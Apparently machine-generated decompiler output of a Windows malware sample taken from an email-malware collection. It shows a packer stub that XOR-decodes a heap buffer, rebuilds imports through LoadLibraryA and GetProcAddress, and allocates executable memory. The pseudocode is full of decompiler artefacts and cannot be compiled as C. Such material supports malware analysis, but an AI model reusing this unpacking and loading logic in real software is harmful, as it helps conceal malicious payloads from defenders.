/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0593/ia32_pe/subject.exe'
 */

stack space not deallocated on return
/*	Procedure: 0x00401030 - 0x00401061
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__(A97a6)
/* unknown */ void  A97a6;
{



    L00401068();
    *( & A97a6 + -38826) = *L00401469();
    esp = esp - 4;
    return(*L0040144C());
}

stack space not deallocated on return
/*	Procedure: 0x00401062 - 0x00401067
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401062()
{



    return(L00401685());
}

stack space not deallocated on return
/*	Procedure: 0x00401068 - 0x004011A1
 *	Argument size: 24468
 *	Local size: 0
 *	Save regs size: 0
 */

L00401068(Af56, A25ba, A6ee6)
/* unknown */ void  Af56;
/* unknown */ void  A25ba;
/* unknown */ void  A6ee6;
{
	/* unknown */ void  Vffff50e2;
	/* unknown */ void  Vffff62d0;
	/* unknown */ void  Vffffa4b2;



    eax = (L00401068 & -65536) + 28672;
    esi = eax + -41814 - -41950;
    ecx = *(eax + 30450 + -30334);
    *L00402000 = ecx;
    *( & Vffff50e2 + 44826) = 0;
    esp = esp - 4;
    *( & A6ee6 + -28394) = 0;
    esp = esp - 4;
    *( & Af56 + -3930) = 1;
    esp = esp + -4;
    (save) *L00402000;
    *( & A25ba + -9662) = 8;
    *( & Vffffa4b2 + 23370) = *__imp__HeapCreate();
    esp = esp + -4;
    eax = *__imp__HeapAlloc();
    *L00402008 = eax;
    *L0040200C = *L00402008 + *L00402000;
    (save) *L00402000;
    *( & Vffff62d0 + 40236) = esi;
    esp = esp - 4;
    (save) *L00402008;
    *L004016A5();
    return(*L004011A2( *L00402008, *L00402000));
}

stack space not deallocated on return
/*	Procedure: 0x004011A2 - 0x004012D8
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L004011A2(A3bb4)
/* unknown */ void  A3bb4;
{



    *( & A3bb4 + -15288) = ebp;
    esp = esp - 4;
    ebp = esp;
    esp = esp - 16;
    esi = ebp + 20180 - 20196;
    *(esi + -50640 + 50640) = 1466043501;
    *(esi + 21318 + -21314) = -1823209568;
    *(esi + -49254 + 49262) = 0;
    ecx = *(ebp + -34764 + 34772);
    edx = *(ebp + -63734 + 63746);
    do {
        *(ecx + 60100 + -60100) = *(ecx + 60100 + -60100) + 228;
        ecx = ecx + 1;
    } while(edx = edx - 1);
    *L00402008 = *L00402008 + 3;
    eax = *L00401643();
    esi = ebp + -27030 + 27014;
    ecx = *(esi + 41600 + -41600) + eax;
    *(esi + -64280 + 64280) = ecx;
    ecx = *L00402008;
    edx = *(ebp + 59262 + -59250);
    edi = -1 & esi;
    do {
        al = *(ecx + -33126 + 33126);
        al = al ^ *(esi + -21516 + 21516);
        *(ecx + -22132 + 22132) = al;
        esi = esi - -1;
        if(*esi == 0) {
            esi = -1 & edi;
        }
        ecx = ecx + 1;
    } while(edx = edx + -1);
    (save) *L00402008;
    (restore) *L00402100;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x004012D9 - 0x00401419
 *	Argument size: 17694
 *	Local size: 0
 *	Save regs size: 0
 */

L004012D9(A7a5e, Abf78)
/* unknown */ void  A7a5e;
/* unknown */ void  Abf78;
{
	/* unknown */ void  Vffffff24;



    *( & A7a5e + -31330) = ebp;
    esp = esp - 4;
    ebp = esp;
    esp = esp - 4;
    esi = *L00402120;
    eax = -1 & esi;
    eax = *(eax + 60 + -53946 + 53946) + esi;
    ebx = *(eax + 128 + 60936 + -60936) + esi;
    do {
        eax = *(ebx + -43226 + 43238);
        eax = eax + *L00402120;
        *( & Vffffff24 + 216) = eax;
        esp = esp + -4;
        *(ebp + 15670 + -15674) = *__imp__LoadLibraryA();
        esi = *(ebx + -59314 + 59314);
        esi = esi + *L00402120;
        edi = *(ebx + -11650 + 11666);
        edi = edi + *L00402120;
        do {
            ecx = *(esi + 54096 + -54096);
            ecx = ecx + *L00402120;
            ecx = ecx + 2;
            *( & Abf78 + -49020) = ecx;
            esp = esp - 4;
            eax = *__imp__GetProcAddress( *(ebp + 14662 + -14666));
            *(edi + -29904 + 29904) = eax;
            edi = edi + 4;
            esi = esi + 4;
        } while(*esi != 0);
        ebx = ebx + 20;
    } while(*(ebx + 12) != 0);
    (restore)ebp;
    return(0);
}

/*	Procedure: 0x0040141A - 0x0040144B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040141A()
{



    edx = 12216;
    *( *( *%fs:edx+0xffffd060] + -37116 + 37164) + -45896 + 45904) = *L00402120;
    return(4252896);
}

/*	Procedure: 0x0040144C - 0x00401468
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040144C()
{



    *L004012D9();
    return(*L0040141A());
}

stack space not deallocated on return
/*	Procedure: 0x00401469 - 0x00401642
 *	Argument size: -18268
 *	Local size: 0
 *	Save regs size: 0
 */

L00401469(A8, A3734, A5a6e, A91d4, Ab8a8)
/* unknown */ void  A8;
/* unknown */ void  A3734;
/* unknown */ void  A5a6e;
/* unknown */ void  A91d4;
/* unknown */ void  Ab8a8;
{
	/* unknown */ void  Vffff1710;
	/* unknown */ void  Vffff5b68;
	/* unknown */ void  Vffff6430;
	/* unknown */ void  Vffff7a88;
	/* unknown */ void  Vffff7b8e;
	/* unknown */ void  Vffff840e;
	/* unknown */ void  Vffffae8c;
	/* unknown */ void  Vfffff6f2;



    *( & Vffff7a88 + 34164) = ebp;
    esp = esp - 4;
    ebp = esp;
    esp = esp - 20;
    *( & Vffff6430 + 39884) = & Vffff6430;
    esp = esp + -4;
    *( & Vffff5b68 + 42132) = esi;
    esp = esp - 4;
    *( & A3734 + -14136) = edi;
    esp = esp - 4;
    ebx = *L00402100;
    ebx = ebx + *(ebx + -43344 + 43404);
    eax = *(ebx + -11256 + 11308);
    *L00402120 = eax;
    eax = *(ebx + 6010 + -6004) & 255;
    *(ebp + 31454 + -31458) = eax;
    *( & Vfffff6f2 + 2314) = 64;
    esp = esp + -4;
    *( & Vffffae8c + 20848) = 12288;
    esp = esp + -4;
    (save) *(ebx + -42446 + 42526);
    (save) *(ebx + 51286 + -51234);
    (save) *__imp__VirtualAlloc();
    (save) *(ebx + -31836 + 31920);
    (save) *L00402100;
    esi = *( & A8);
    *( & Vffff840e + 31726) = esi;
    esp = esp - 4;
    *L004016A5();
    edi = ebx + -48606 + 48854;
    do {
        eax = *L00402100 + *(edi + 55888 + -55868);
        ecx = -1 & esi;
        ecx = ecx + *(edi + 6484 + -6472);
        *( & A91d4 + -37336) = eax;
        *( & Vffff1710 + 59628) = ecx;
        esp = esp + -4;
        *L004016A5( *(edi + -9458 + 9474));
        edi = edi + 40;
    } while(*(ebp - 4) = *(ebp - 4) - 1);
    eax = *(ebx + -18568 + 18608) + esi;
    edi = *( & Ab8a8 + -47272);
    esi = *( & A5a6e + -23150);
    esp = esp - -4;
    ebx = *( & Vffff7b8e + 33906);
    esp = esp - -4;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00401643 - 0x00401684
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401643(A8af2)
/* unknown */ void  A8af2;
{
	/* unknown */ void  Vffffabc0;



    *( & Vffffabc0 + 21564) = ebp;
    esp = esp + -4;
    ebp = esp;
    *__imp__AllocateUserPhysicalPages();
    esp = 0;
    esp = esp - 1;
    esp = esp & ebp;
    ebp = *( & A8af2 + -35570);
    esp = esp - -4;
    return(*__imp__GetLastError());
}

stack space not deallocated on return
/*	Procedure: 0x00401685 - 0x00401768
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L00401685(A5234, A5a08, A6914, Ab0e4)
/* unknown */ void  A5234;
/* unknown */ void  A5a08;
/* unknown */ void  A6914;
/* unknown */ void  Ab0e4;
{
	/* unknown */ void  Vffff6056;
	/* unknown */ void  Vffff61a0;
	/* unknown */ void  Vffffced6;
	/* unknown */ void  Vfffff44c;



    *( & Vffffced6 + 12582) = 0;
    esp = esp + -4;
    *__imp__ExitProcess();
    *( & A5a08 + -23052) = ebp;
    esp = esp - 4;
    ebp = -1 & esp;
    *( & Vffff61a0 + 40540) = esi;
    *( & Vffff6056 + 40870) = edi;
    esp = esp - 4;
    *( & Vfffff44c + 2992) = ebx;
    esp = esp + -4;
    eax = *(ebp + 9950 + -9938);
    edx = *(ebp + 25404 + -25396);
    ecx = *(ebp + -12632 + 12648);
    if(ecx != 0) {
        do {
            bl = *(eax + 57912 + -57912);
            *(edx + 61200 + -61200) = bl;
            eax = eax - -1;
            edx = edx - -1;
        } while(ecx = ecx - 1);
    }
    ebx = *( & A5234 + -21044);
    esp = esp + 4;
    edi = *( & Ab0e4 + -45284);
    esp = esp - -4;
    esi = *( & A6914 + -26900);
    esp = esp - -4;
    esp = ebp;
    (restore)ebp;
}

/*	Procedure: 0x00401769 - 0x0040176B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401769()
{



    asm("int3");
    asm("int3");
    asm("int3");
}

/* address  size  */
/* 0x00401000       0 */ /* unknown */ void 	__imp__AllocateUserPhysicalPages;
/* 0x00401004       0 */ /* unknown */ void 	__imp__ExitProcess;
/* 0x00401008       0 */ /* unknown */ void 	__imp__GetLastError;
/* 0x0040100c       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x00401010       0 */ /* unknown */ void 	__imp__HeapAlloc;
/* 0x00401014       0 */ /* unknown */ void 	__imp__HeapCreate;
/* 0x00401018       0 */ /* unknown */ void 	__imp__LoadLibraryA;
/* 0x0040101c       0 */ /* unknown */ void 	__imp__VirtualAlloc;
/* 0x00401030       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
